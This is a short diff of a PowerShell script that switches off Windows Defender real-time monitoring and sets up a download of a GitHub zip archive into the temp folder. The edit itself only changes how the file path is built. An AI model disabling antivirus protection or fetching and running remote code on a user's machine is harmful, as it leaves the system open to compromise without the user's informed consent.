@@ -4,7 +4,7 @@
 Write-Host '[INFO] Stopping Windows Defender' -ForegroundColor Cyan
 Set-MpPreference -DisableRealtimeMonitoring $true -Force
 $URL = 'https://github.com/mimoteb/windep/archive/refs/heads/main.zip'
-$repo_OutFile = "$env:TEMP\windep-main.zip"
+$repo_OutFile = (Join-Path $env:TEMP "\windep-main.zip")
 $TempDir = [System.IO.Path]::GetTempPath()
 $BaseDir = Join-Path $TempDir 'windep-main'
 # Remove WinDep-Main directory in Temp if Existed 
